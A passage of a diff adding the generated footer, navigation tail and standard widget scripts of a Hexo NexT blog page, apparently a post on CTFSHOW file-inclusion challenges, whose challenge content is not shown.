class="nav-item nav-level-4"><a class="nav-link" href="#web116"><span class="nav-number">1.12.</span> <span class="nav-text">web116</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web117"><span class="nav-number">1.13.</span> <span class="nav-text">web117</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder"></span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div> 
+   
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.1.1</div>
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+<span id="busuanzi_container_site_pv">
+    <br>本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.1"></script>
+
+  <script src="/js/motion.js?v=7.1.1"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.1.1"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.1.1"></script>
+
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.1"></script>
+<script src="/js/post-details.js?v=7.1.1"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.1"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+    <script>
+  window.livereOptions = {
+    refer: '2021/09/29/CTFSHOW-web入门-文件包含/'
+  };
+  (function(d, s) {
+    var j, e = d.getElementsByTagName(s)[0];
+    if (typeof LivereTower === 'function') { return; }
+    j = d.createElement(s);
+    j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+    j.async = true;
+    e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+</script>
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+</body>
+</html>
